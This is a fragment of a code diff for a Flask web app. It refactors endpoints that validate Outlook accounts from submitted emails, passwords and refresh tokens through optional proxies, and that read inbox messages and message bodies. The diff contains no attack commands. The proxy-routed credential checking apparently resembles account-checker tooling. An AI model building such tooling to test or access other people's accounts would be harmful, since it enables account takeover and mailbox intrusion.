 @app.route("/check_single_outlook", methods=["POST"])
 @app.route("/api/check_single_outlook", methods=["POST"])
 def api_check_single_outlook():
@@ -1342,10 +1720,10 @@ def api_check_single_outlook():
     email = payload.get("email", "")
     password = payload.get("password", "")
     refresh_token = payload.get("refresh_token", "")
-    client_id = payload.get("client_id", outlook_check.DEFAULT_CLIENT_ID)
+    client_id = payload.get("client_id", DEFAULT_CLIENT_ID)
     proxy_url = payload.get("proxy", "").strip() or None
 
-    res = outlook_check.check_outlook_account(
+    res = check_outlook_account(
         email=email,
         password=password,
         refresh_token=refresh_token,
@@ -1354,31 +1732,27 @@ def api_check_single_outlook():
     )
     return jsonify(res)
 
-
-# TrackMail: Get Inbox Messages
 @app.route("/mail/inbox", methods=["POST"])
 @app.route("/api/mail/inbox", methods=["POST"])
 def api_mail_inbox():
     payload = request.get_json(force=True)
     refresh_token = payload.get("refresh_token", "")
-    client_id = payload.get("client_id", outlook_check.DEFAULT_CLIENT_ID)
+    client_id = payload.get("client_id", DEFAULT_CLIENT_ID)
     proxy = payload.get("proxy") or None
 
-    data = outlook_check.fetch_inbox_messages(refresh_token=refresh_token, client_id=client_id, proxy=proxy, top=40)
+    data = fetch_inbox_messages(refresh_token=refresh_token, client_id=client_id, proxy=proxy, top=40)
     return jsonify(data)
 
-
-# TrackMail: Get Message Detail & HTML Body
 @app.route("/mail/message", methods=["POST"])
 @app.route("/api/mail/message", methods=["POST"])
 def api_mail_message():
     payload = request.get_json(force=True)
     message_id = payload.get("message_id", "")
     refresh_token = payload.get("refresh_token", "")
-    client_id = payload.get("client_id", outlook_check.DEFAULT_CLIENT_ID)
+    client_id = payload.get("client_id", DEFAULT_CLIENT_ID)
     proxy = payload.get("proxy") or None
 
-    data = outlook_check.fetch_message_detail(message_id=message_id, refresh_token=refresh_token, client_id=client_id, proxy=proxy)
+    data = fetch_message_detail(message_id=message_id, refresh_token=refresh_token, client_id=client_id, proxy=proxy)
     return jsonify(data)
 
 @app.after_request
